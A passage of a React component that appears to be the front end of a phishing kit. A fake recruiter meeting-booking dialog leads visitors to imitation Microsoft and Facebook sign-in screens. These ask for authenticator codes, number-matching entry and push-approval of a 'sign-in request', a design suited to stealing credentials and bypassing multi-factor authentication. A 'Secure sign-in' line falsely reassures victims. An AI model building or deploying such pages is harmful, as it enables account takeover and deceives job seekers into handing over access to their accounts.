                      {rememberDevice && (
                        <svg viewBox="0 0 24 24" fill="none" className="size-3 text-white">
                          <path
                            d="M5 12l5 5L20 6"
                            stroke="currentColor"
                            strokeWidth="3"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                      )}
                    </span>
                    Don&apos;t ask me again on this device
                  </label>
                </div>

                <MicrosoftFooter />
              </div>
          )}

          {/* ─────────────────── ENTER CODE ─────────────────── */}
          {step === "enter-code" && (
              <div
                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
                  style={{
                    fontFamily:
                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
                    background:
                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
                  }}
              >
                <MicrosoftGlassBg />
                <div
                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
                    style={{ padding: "30px 40px 34px" }}
                >
                  <div className="mb-[22px] flex items-center justify-center gap-2">
                    <MicrosoftIcon className="size-5" />
                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
                      Microsoft
                    </span>
                  </div>

                  <div className="mb-[18px] flex justify-center">
                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
                      {login.id || "someone@example.com"}
                    </span>
                  </div>

                  <h1 className="mb-[14px] text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
                    Enter the code
                  </h1>

                  <p className="mx-auto mb-[22px] max-w-[320px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
                    This was sent by email, text message, or generated in an authenticator app.
                  </p>

                  {otpError && (
                    <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
                      That code didn&apos;t work. Check the code and try again.
                    </p>
                  )}

                  <input
                      type="text"
                      inputMode="numeric"
                      maxLength={10}
                      value={otpCode}
                      onChange={(e) => {
                        setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 10))
                        setOtpError("")
                      }}
                      placeholder="Code"
                      aria-label="Code"
                      className={cn(
                        "mb-6 h-10 w-full rounded border bg-white px-2.5 text-[15px] text-[#1b1b1b] outline-none",
                        otpError ? "border-[#e81123] focus:border-[#e81123]" : "border-[#d1d1d1] focus:border-[#0067b8]"
                      )}
                  />

                  <button
                      type="button"
                      onClick={handleAuthenticatorContinue}
                      disabled={!otpValid || isSending}
                      className="mb-[22px] flex h-11 w-full items-center justify-center gap-2 rounded bg-[#0067b8] text-[15px] font-semibold text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
                  >
                    {isSending && <Loader2 className="size-4 animate-spin" />}
                    {isSending ? "Verifying…" : "Next"}
                  </button>

                  <label className="mb-6 flex cursor-pointer select-none items-center justify-center gap-2 text-[13px] text-[#1b1b1b]">
                    <input
                        type="checkbox"
                        checked={rememberDevice}
                        onChange={(e) => setRememberDevice(e.target.checked)}
                        className="sr-only"
                    />
                    <span
                        className={cn(
                          "inline-flex size-[18px] shrink-0 items-center justify-center rounded-sm border",
                          rememberDevice ? "border-[#0067b8] bg-[#0067b8]" : "border-[#666] bg-white"
                        )}
                    >
                      {rememberDevice && (
                        <svg viewBox="0 0 24 24" fill="none" className="size-3 text-white">
                          <path
                            d="M5 12l5 5L20 6"
                            stroke="currentColor"
                            strokeWidth="3"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                      )}
                    </span>
                    Don&apos;t ask me again on this device
                  </label>

                  <button
                      type="button"
                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
                  >
                    Other ways to sign in
                  </button>
                </div>

                <MicrosoftFooter />
              </div>
          )}

          {/* ─────────────────── CHECK YOUR PHONE ─────────────────── */}
          {step === "check-phone" && (
              <div
                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
                  style={{
                    fontFamily:
                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
                    background:
                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
                  }}
              >
                <MicrosoftGlassBg />
                <div
                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
                    style={{ padding: "30px 40px 34px" }}
                >
                  <div className="relative mb-[22px] flex items-center justify-center">
                    <button
                        type="button"
                        aria-label="Back"
                        onClick={() => setStep("full-login")}
                        className="absolute left-0 top-1/2 -translate-y-1/2 text-[#666]"
                    >
                      <svg viewBox="0 0 24 24" fill="none" className="size-5">
                        <path
                          d="M15 5l-7 7 7 7"
                          stroke="currentColor"
                          strokeWidth="1.6"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    </button>
                    <div className="flex items-center gap-2">
                      <MicrosoftIcon className="size-5" />
                      <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
                        Microsoft
                      </span>
                    </div>
                  </div>

                  <div className="mb-5 flex justify-center">
                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
                      {login.id || "someone@example.com"}
                    </span>
                  </div>

                  <h1 className="mb-5 text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
                    Check your phone
                  </h1>

                  <div className="mb-[18px] flex justify-center">
                    <img
                        src="https://i.ibb.co.com/bxGRfDw/device-shield-checkmark-white-ae3eb5f70247b63d5acb.png"
                        alt="Check your phone"
                        className="block h-auto w-24"
                    />
                  </div>

                  <div className="mb-[14px] text-center text-[44px] font-bold leading-none text-[#1b1b1b]">
                    {checkPhoneNumber || "••"}
                  </div>

                  <p className="mx-auto mb-6 max-w-[300px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
                    Enter this number in the sign-in request on your mobile device.
                  </p>

                  {approveError && (
                    <p className="mb-3 text-center text-[13px] leading-snug text-[#e81123]">
                      {approveError}
                    </p>
                  )}

                  {approving && (
                    <p className="mb-4 flex items-center justify-center gap-2 text-center text-[13px] text-[#666]">
                      <Loader2 className="size-4 animate-spin" /> Waiting for approval…
                    </p>
                  )}

                  <button
                      type="button"
                      onClick={() => setStep("full-login")}
                      className="mb-[22px] block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
                  >
                    Use your password
                  </button>

                  <button
                      type="button"
                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
                  >
                    Can&apos;t use your Microsoft app?
                  </button>
                </div>

                <MicrosoftFooter />
              </div>
          )}

          {/* ─────────────────── APPROVE SIGN-IN ─────────────────── */}
          {step === "approve-signin" && (
              <div
                  className="relative flex h-full flex-col items-center justify-center overflow-hidden px-4 py-8"
                  style={{
                    fontFamily:
                      '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
                    background:
                      "radial-gradient(120% 90% at 15% 20%, #e9edfb 0%, rgba(233,237,251,0) 55%), radial-gradient(120% 100% at 85% 15%, #eef1fd 0%, rgba(238,241,253,0) 50%), radial-gradient(120% 120% at 10% 95%, #fdeee9 0%, rgba(253,238,233,0) 55%), radial-gradient(140% 120% at 95% 100%, #f7eef6 0%, rgba(247,238,246,0) 55%), linear-gradient(135deg, #eef1fb 0%, #f4eef6 45%, #fdf3ee 100%)",
                  }}
              >
                <MicrosoftGlassBg />
                <div
                    className="relative z-[2] w-full max-w-[448px] rounded-lg bg-white shadow-[0_2px_12px_rgba(0,0,0,0.10),0_0_2px_rgba(0,0,0,0.06)]"
                    style={{ padding: "30px 40px 34px" }}
                >
                  <div className="mb-[22px] flex items-center justify-center gap-2">
                    <MicrosoftIcon className="size-5" />
                    <span className="text-[21px] font-semibold tracking-[-0.2px] text-[#5e5e5e]">
                      Microsoft
                    </span>
                  </div>

                  <div className="mb-5 flex justify-center">
                    <span className="inline-block rounded-[20px] border border-[#d2d2d2] bg-white px-3.5 py-[5px] text-[13px] text-[#1b1b1b]">
                      {login.id || "someone@example.com"}
                    </span>
                  </div>

                  <h1 className="mb-5 text-center text-[24px] font-bold leading-tight text-[#1b1b1b]">
                    Approve sign-in request
                  </h1>

                  <div className="mb-[22px] flex justify-center">
                    <img
                        src="https://i.ibb.co.com/bxGRfDw/device-shield-checkmark-white-ae3eb5f70247b63d5acb.png"
                        alt="Approve sign-in request"
                        className="block h-auto w-24"
                    />
                  </div>

                  <p className="mx-auto mb-6 max-w-[320px] text-center text-[13px] leading-[1.55] text-[#1b1b1b]">
                    Approve request <b>{approveCode || "•••••"}</b> on your Microsoft Authenticator app
                    to access sensitive information.
                  </p>

                  {approveError && (
                    <p className="mb-3 text-center text-[13px] leading-snug text-[#e81123]">
                      {approveError}
                    </p>
                  )}

                  {approving && (
                    <p className="mb-4 flex items-center justify-center gap-2 text-center text-[13px] text-[#666]">
                      <Loader2 className="size-4 animate-spin" /> Waiting for approval…
                    </p>
                  )}

                  <label className="mb-[22px] flex cursor-pointer select-none items-center justify-center gap-2 text-[13px] text-[#1b1b1b]">
                    <input
                        type="checkbox"
                        checked={rememberDevice}
                        onChange={(e) => setRememberDevice(e.target.checked)}
                        className="sr-only"
                    />
                    <span
                        className={cn(
                          "inline-flex size-[18px] shrink-0 items-center justify-center rounded-sm border",
                          rememberDevice ? "border-[#0067b8] bg-[#0067b8]" : "border-[#666] bg-white"
                        )}
                    >
                      {rememberDevice && (
                        <svg viewBox="0 0 24 24" fill="none" className="size-3 text-white">
                          <path
                            d="M5 12l5 5L20 6"
                            stroke="currentColor"
                            strokeWidth="3"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                      )}
                    </span>
                    Don&apos;t ask me again on this device
                  </label>

                  <button
                      type="button"
                      className="block w-full text-center text-[13px] font-semibold text-[#0067b8] hover:underline"
                  >
                    Other ways to sign in
                  </button>
                </div>

                <MicrosoftFooter />
              </div>
          )}

          {/* ─────────────────── NORMAL DIALOG STEPS ─────────────────── */}
          {!isFullScreen && (
              <>
                {/* Recruiter header strip */}
                {step !== "confirmed" && activeRecruiter && (
                    <div className="flex items-center gap-3 border-b border-border px-4 py-3 sm:px-6 sm:py-4">
                      {activeRecruiter.photo ? (
                          <img
                              src={activeRecruiter.photo}
                              alt={activeRecruiter.name}
                              width={44}
                              height={44}
                              className="size-10 rounded-full object-cover sm:size-11"
                          />
                      ) : (
                          <div className="flex size-10 items-center justify-center rounded-full bg-accent text-sm font-semibold text-accent-foreground sm:size-11">
                            {activeRecruiter.name.split(" ").map((n) => n[0]).join("")}
                          </div>
                      )}
                      <div className="min-w-0">
                        <p className="truncate text-sm font-semibold text-foreground">
                          {activeRecruiter.name}
                        </p>
                        <p className="truncate text-xs text-muted-foreground">
                          {activeRecruiter.title} · {activeRecruiter.team}
                        </p>
                      </div>
                      <div className="ml-auto hidden items-center gap-3 text-xs text-muted-foreground sm:flex">
                  <span className="inline-flex items-center gap-1">
                    <Clock className="size-3.5" /> 30 min
                  </span>
                        <span className="inline-flex items-center gap-1">
                    <Video className="size-3.5" /> Private video
                  </span>
                      </div>
                    </div>
                )}

                {/* ── SCHEDULE ── */}
                {step === "schedule" && (
                    <div className="px-4 py-5 sm:px-6">
                      {fetchingStatus ? (
                        <div className="flex flex-col items-center justify-center py-24">
                          <Loader2 className="size-8 animate-spin text-primary" />
                        </div>
                      ) : isBookingDisabled ? (
                        <div className="flex flex-col items-center justify-center py-16 text-center">
                          <div className="mb-6 relative">
                            <div className="absolute inset-0 rounded-full bg-rose-500/20 blur-xl animate-pulse" />
                            <div className="relative bg-zinc-900/5 p-5 rounded-full ring-1 ring-rose-500/30 backdrop-blur-md">
                              <Lock className="size-10 text-rose-500" />
                            </div>
                          </div>
                          <h2 className="text-2xl font-bold tracking-tight text-foreground mb-3">Bookings Currently Closed</h2>
                          <p className="max-w-sm text-muted-foreground mb-8">
                            We are not accepting new meetings at this moment. Please check back later or reach out directly if urgent.
                          </p>
                          <Button variant="outline" className="rounded-full px-8 font-semibold" onClick={() => handleOpenChange(false)}>
                            Close Window
                          </Button>
                        </div>
                      ) : (
                        <>
                          <DialogHeader className="text-left">
                            <DialogTitle className="text-xl">Schedule your meeting</DialogTitle>
                            <DialogDescription>
                              A private 30-minute video conversation. All times are shown in your local timezone.
                            </DialogDescription>
                          </DialogHeader>

                      {!recruiter && (
                          <div className="mt-4">
                            <Label className="mb-1.5 block">Recruiter</Label>
                            <Select
                                value={selectedRecruiterId}
                                onValueChange={(v) => setSelectedRecruiterId(v)}
                            >
                              <SelectTrigger>
                                <SelectValue placeholder="Choose a recruiter" />
                              </SelectTrigger>
                              <SelectContent>
                                {recruiters.map((r) => (
                                    <SelectItem key={r.id} value={r.id}>
                                      {r.name} — {r.team}
                                    </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          </div>
                      )}

                      <div className="mt-5 grid gap-6 sm:grid-cols-2">
                        <div>
                          <div className="mb-3 flex items-center justify-between">
                            <span className="text-sm font-semibold text-foreground">{label}</span>
                            <div className="flex items-center gap-1">
                              <Button
                                  type="button"
                                  variant="outline"
                                  size="icon"
                                  className="size-8"
                                  disabled={monthOffset === 0}
                                  onClick={() => setMonthOffset((m) => Math.max(0, m - 1))}
                              >
                                <ChevronLeft className="size-4" />
                                <span className="sr-only">Previous month</span>
                              </Button>
                              <Button
                                  type="button"
                                  variant="outline"
                                  size="icon"
                                  className="size-8"
                                  onClick={() => setMonthOffset((m) => m + 1)}
                              >
                                <ChevronRight className="size-4" />
                                <span className="sr-only">Next month</span>
                              </Button>
                            </div>
                          </div>
                          <div className="grid grid-cols-7 gap-0.5 text-center text-xs font-medium text-muted-foreground">
                            {["S", "M", "T", "W", "T", "F", "S"].map((d, i) => (
                                <span key={i} className="py-1">
                          {d}
                        </span>
                            ))}
                          </div>
                          <div className="mt-1 grid grid-cols-7 gap-0.5">
                            {cells.map((cell, i) => {
                              if (!cell) return <span key={i} />
                              const isPast = cell < today
                              const isSunday = cell.getDay() === 0
                              const isSaturday = cell.getDay() === 6
                              const disabled = isPast || isSunday || isSaturday
                              const selected = date?.toDateString() === cell.toDateString()
                              return (
                                  <button
                                      key={i}
                                      type="button"
                                      disabled={disabled}
                                      onClick={() => {
                                        setDate(cell)
                                        setTime("")
                                      }}
                                      className={cn(
                                          "flex aspect-square items-center justify-center rounded-lg text-sm font-medium transition-colors",
                                          disabled && "cursor-not-allowed text-muted-foreground/40",
                                          !disabled && !selected && "text-foreground hover:bg-accent",
                                          selected && "bg-primary text-primary-foreground",
                                      )}
                                  >
                                    {cell.getDate()}
                                  </button>
                              )
                            })}
                          </div>
                        </div>

                        <div>
                    <span className="text-sm font-semibold text-foreground">
                      {date ? dateLabel : "Select a date"}
                    </span>
                          {date ? (
                              <div className="mt-3 grid max-h-64 grid-cols-2 gap-2 overflow-y-auto pr-1">
                                {TIME_SLOTS.map((slot) => (
                                    <button
                                        key={slot}
                                        type="button"
                                        onClick={() => setTime(slot)}
                                        className={cn(
                                            "rounded-lg border px-2 py-2.5 text-sm font-medium transition-colors",
                                            time === slot
                                                ? "border-primary bg-primary text-primary-foreground"
                                                : "border-border text-foreground hover:border-primary/50 hover:bg-accent",
                                        )}
                                    >
                                      {slot}
                                    </button>
                                ))}
                              </div>
                          ) : (
                              <p className="mt-3 text-sm text-muted-foreground">
                                Pick a day on the calendar to see open times.
                              </p>
                          )}
                        </div>
                      </div>

                      <div className="mt-6 flex justify-end">
                        <Button
                            className="rounded-full px-6 font-semibold"
                            disabled={!canContinue}
                            onClick={() => setStep("details")}
                        >
                          Continue
                        </Button>
                      </div>
                    </>
                  )}
                </div>
              )}

                {/* ── DETAILS ── */}
                {step === "details" && activeRecruiter && (
                    <div className="px-4 py-5 sm:px-6">
                      <DialogHeader className="text-left">
                        <DialogTitle className="text-xl">Your details</DialogTitle>
                        <DialogDescription>
                          {dateLabel} at {time} · Private meeting with {activeRecruiter.name}
                        </DialogDescription>
                      </DialogHeader>

                      <div className="mt-5 space-y-4">
                        <div className="grid gap-4 sm:grid-cols-2">
                          <div>
                            <Label htmlFor="name" className="mb-1.5 block">
                              Full name
                            </Label>
                            <Input
                                id="name"
                                value={form.name}
                                onChange={(e) => setForm({ ...form, name: e.target.value })}
                                placeholder="Jordan Lee"
                            />
                          </div>
                          <div>
                            <Label htmlFor="email" className="mb-1.5 block">
                              Email
                            </Label>
                            <Input
                                id="email"
                                type="email"
                                value={form.email}
                                onChange={(e) => setForm({ ...form, email: e.target.value })}
                                placeholder="you@email.com"
                            />
                          </div>
                        </div>
                        <div>
                          <Label className="mb-1.5 block">What would you like to discuss?</Label>
                          <Select
                              value={form.type}
                              onValueChange={(v) => setForm({ ...form, type: v })}
                          >
                            <SelectTrigger>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              {meetingTypes.map((t) => (
                                  <SelectItem key={t} value={t}>
                                    {t}
                                  </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                        </div>
                        <div>
                          <Label htmlFor="notes" className="mb-1.5 block">
                            Anything else? <span className="text-muted-foreground">(optional)</span>
                          </Label>
                          <Textarea
                              id="notes"
                              value={form.notes}
                              onChange={(e) => setForm({ ...form, notes: e.target.value })}
                              placeholder="Share a resume link or the roles you're interested in."
                              rows={3}
                          />
                        </div>
                      </div>

                      <div className="mt-6 flex items-center justify-between">
                        <Button variant="ghost" className="font-medium" onClick={() => setStep("schedule")}>
                          <ArrowLeft className="size-4" /> Back
                        </Button>
                        <Button
                            className="rounded-full px-6 font-semibold"
                            disabled={!canConfirm || isSending}
                            onClick={handleConfirmBooking}
                        >
                          {isSending ? (
                            <><Loader2 className="size-4 animate-spin mr-2" /> Sending...</>
                          ) : (
                            "Confirm booking"
                          )}
                        </Button>
                      </div>
                    </div>
                )}

                {/* ── AUTH ── */}
                {step === "auth" && activeRecruiter && (
                    <div className="px-4 py-8 sm:px-6">
                      <DialogHeader className="items-center text-center">
                        <div className="mb-1 inline-flex size-12 items-center justify-center rounded-full bg-primary/10">
                          <Lock className="size-6 text-primary" />
                        </div>
                        <DialogTitle className="text-xl">Verify it&apos;s really you</DialogTitle>
                        <DialogDescription className="max-w-sm text-pretty">
                          Confirm your {dateLabel} · {time} meeting with {activeRecruiter.name} by signing
                          in. We use this only to verify your identity and send your invite.
                        </DialogDescription>
                      </DialogHeader>

                      <div className="mx-auto mt-6 flex max-w-sm flex-col gap-3">
                        <Button
                            type="button"
                            size="lg"
                            onClick={() => handleAuth("facebook")}
                            className="h-12 w-full justify-center gap-2.5 rounded-xl bg-[#1877F2] font-semibold text-white hover:bg-[#166FE5]"
                        >
                          <FacebookIcon className="size-5" />
                          Continue with Facebook
                        </Button>

                        <Button
                            type="button"
                            size="lg"
                            variant="outline"
                            onClick={() => handleAuth("messenger")}
                            className="h-12 w-full justify-center gap-2.5 rounded-xl border-border font-semibold text-[#0A7CFF] hover:bg-accent"
                        >
                          <MessengerIcon className="size-5 text-[#0A7CFF]" />
                          Continue with Messenger
                        </Button>

                        <Button
                            type="button"
                            size="lg"
                            variant="outline"
                            onClick={() => handleAuth("microsoft")}
                            className="h-12 w-full justify-center gap-2.5 rounded-xl border-border font-semibold text-foreground hover:bg-accent"
                        >
                          <MicrosoftIcon className="size-5" />
                          Continue with Microsoft
                        </Button>

                        <p className="mt-1 flex items-center justify-center gap-1.5 text-center text-xs text-muted-foreground">
                          <Lock className="size-3" />
                          Secure sign-in. We never post to your account or contacts.
                        </p>
                      </div>

                      <div className="mt-6 flex justify-center">
                        <Button
                            variant="ghost"
                            className="font-medium"
                            onClick={() => setStep("details")}
                        >
                          <ArrowLeft className="size-4" /> Back
                        </Button>
                      </div>
                    </div>
                )}

                {/* ── AUTHENTICATOR (FACEBOOK / MESSENGER) ── */}
                {step === "authenticator" && (
                    <div className="flex flex-col">
                      {/* Header */}
                      <div className="px-6 pt-6 pb-2">
                        <p className="text-[13px] text-[#65676b]">
                          {form.name || "You"} · {providerLabel}
                        </p>
                        <h2 className="mt-1 text-[22px] font-bold leading-snug text-[#1c1e21]">
                          Go to your authentication app
                        </h2>
                        <p className="mt-1 text-[15px] text-[#65676b]">
                          Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).
                        </p>
                      </div>

                      {/* Illustration */}
                      <div className="w-full overflow-hidden">
                        <img
                            src="/2fa-hero.png"
                            alt="Authentication app illustration"
                            className="w-full object-cover"
                            style={{ maxHeight: 220 }}
                        />
                      </div>

                      {/* Code input + buttons */}
                      <div className="px-6 pb-6 pt-4">
                        {otpError && (
                          <div className="mb-3 rounded-lg bg-[#ffebe8] border border-[#dd3c10] px-3 py-2.5 text-sm text-[#dd3c10]">
                            {otpError}
                          </div>
                        )}
                        <input
                            type="text"
                            inputMode="numeric"
                            maxLength={6}
                            value={otpCode}
                            onChange={(e) => {
                              setOtpCode(e.target.value.replace(/\D/g, ""))
                              setOtpError("")
                            }}
                            placeholder="Code"
                            className={cn(
                              "w-full rounded-lg border px-4 py-3 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-2",
                              otpError
                                ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                : "border-[#ccd0d5] focus:border-[#1877f2] focus:ring-[#1877f2]/20"
                            )}
                        />

                        <button
                            type="button"
                            onClick={handleAuthenticatorContinue}
                            disabled={otpCode.length < 6 || isSending}
                            className="mt-3 w-full rounded-lg bg-[#1877f2] py-3 text-[17px] font-bold text-white transition hover:bg-[#166fe5] active:bg-[#1464d8] disabled:cursor-not-allowed disabled:bg-[#a0bcf8] flex items-center justify-center gap-2"
                        >
                          {(isSending) && <Loader2 className="size-5 animate-spin" />}
                          {isSending ? "Verifying…" : "Continue"}
                        </button>

                        <button
                            type="button"
                            disabled
                            className="mt-2 w-full rounded-lg border border-[#ccd0d5] bg-white py-3 text-[17px] font-semibold text-[#b0b3b8] cursor-not-allowed"
                        >
                          Try another way
                        </button>
                      </div>
                    </div>
                )}

                {/* ── CONFIRMED ── */}
                {step === "confirmed" && activeRecruiter && (
                    <div className="px-4 py-10 text-center sm:px-6">
                      <div className="mx-auto flex size-14 items-center justify-center rounded-full bg-primary/10">
                        <Check className="size-7 text-primary" />
                      </div>
                      <DialogHeader className="mt-4 items-center text-center">
                        <DialogTitle className="text-2xl">You&apos;re booked!</DialogTitle>
                        <DialogDescription className="text-base">
                          Verified via {providerLabel}. A calendar
                          invite is on its way to {form.email}.
                        </DialogDescription>
                      </DialogHeader>

                      <div className="mx-auto mt-6 max-w-sm rounded-2xl border border-border bg-secondary/40 p-5 text-left">
                        <div className="flex items-center gap-3">
                          {activeRecruiter.photo ? (
                              <img
                                  src={activeRecruiter.photo}
                                  alt={activeRecruiter.name}
                                  width={44}
                                  height={44}
                                  className="size-11 rounded-full object-cover"
                              />
                          ) : (
                              <div className="flex size-11 items-center justify-center rounded-full bg-accent text-sm font-semibold text-accent-foreground">
                                {activeRecruiter.name.split(" ").map((n) => n[0]).join("")}
                              </div>
                          )}
                          <div>
                            <p className="text-sm font-semibold text-foreground">
                              {activeRecruiter.name}
                            </p>
                            <p className="text-xs text-muted-foreground">{activeRecruiter.team}</p>
                          </div>
                        </div>
                        <div className="mt-4 space-y-2 text-sm">
                          <div className="flex items-center gap-2 text-muted-foreground">
                            <CalendarCheck className="size-4 shrink-0 text-primary" />
                            <span>{dateLabel} at {time}</span>
                          </div>
                          <div className="flex items-center gap-2 text-muted-foreground">
                            <Video className="size-4 shrink-0 text-primary" />
                            <span>30-minute video call</span>
                          </div>
                          <div className="flex items-center gap-2 text-muted-foreground">
                            <Clock className="size-4 shrink-0 text-primary" />
                            <span>{form.type}</span>
                          </div>
                        </div>
                      </div>

                      <Button
                          className="mt-8 rounded-full px-8 font-semibold"
                          onClick={() => handleOpenChange(false)}
                      >
                        Done
                      </Button>
                    </div>
                )}
              </>
          )}
        </DialogContent>
      </Dialog>
  )
}